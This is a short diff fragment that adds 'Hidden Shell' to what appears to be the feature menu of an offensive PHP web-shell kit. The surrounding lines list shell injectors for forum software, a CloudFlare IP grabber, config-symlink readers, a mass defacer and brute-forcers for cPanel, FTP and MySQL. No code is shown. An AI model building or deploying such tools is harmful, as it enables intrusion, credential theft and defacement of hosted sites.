@@ -26,6 +26,7 @@ Shell Injector [WHMCS][vBulletin][MYBB]
 PHP2XML Creator ~ [For vBulletin]
 CloudFlare ByPasser ~ [IP Grabber] 
 WHMCS Decoder 
+Hidden Shell
 Symlink [Domains(Cpanel)][Whole Symlink(Cpanel/Direct-Admin)][Config Symlink][File Symlink][Config Fucker][Get User With Perl] 
 Mass Defacer ~ [ For Deface all Files Or Just Index Directories ]
 BruteForCer [CPANEL][DIRECT-ADMIN][FTP][PHPMYADMIN][MYSQL_CONNECT()][FTP_CONNECT()]
